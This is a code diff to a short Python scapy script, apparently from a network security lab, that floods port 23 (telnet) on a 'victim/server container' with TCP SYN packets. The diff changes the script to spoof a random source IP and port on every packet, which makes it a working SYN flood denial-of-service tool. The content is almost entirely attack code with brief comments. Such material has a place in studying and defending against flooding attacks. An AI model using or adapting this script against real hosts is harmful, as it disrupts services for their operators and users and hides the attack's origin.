@@ -3,23 +3,24 @@ from scapy.all import *
 from random import randrange
 import sys
 
-strSourceIP = "10.9.0.1"
-intSourcePort = randrange(1, 65535)  # Pick an arbirtrary source port number
-
+# Targeting victim/server container's telnet port
 strDestinationIP = "10.9.0.5"
-intDestinationPort =  23  # Targeting telnet port
-
-# IP information will not change
-lyrIP = IP(src=strSourceIP, dst=strDestinationIP)
+intDestinationPort =  23
 
 while True:  # Run until CTRL+C
+
+    # Pick an arbirtrary source IP address and port number
+    intSourcePort = randrange(1, 65535)
+    strSourceIP = str(RandIP())
     
-    # Build the packet with a random sequence index
-    intSequenceIndex = randrange(1, 4294967295)  # Use an arbitrarily random number for sequence number
-    lyrTCP = TCP(sport=intSourcePort, dport=intDestinationPort, flags="S", seq=intSequenceIndex)
+    # Build the IP layer of the packet
+    lyrIP = IP(src=strSourceIP, dst=strDestinationIP)
+
+    # Build TCP layer of the packet
+    lyrTCP = TCP(sport=intSourcePort, dport=intDestinationPort, flags="S", seq=randrange(1,4294967295))
+    
+    # Build the full packet and show it
     pktSynPacket = lyrIP / lyrTCP
-    
-    # Show the information of the packet before sending
     pktSynPacket.show()
 
     # Send the packet
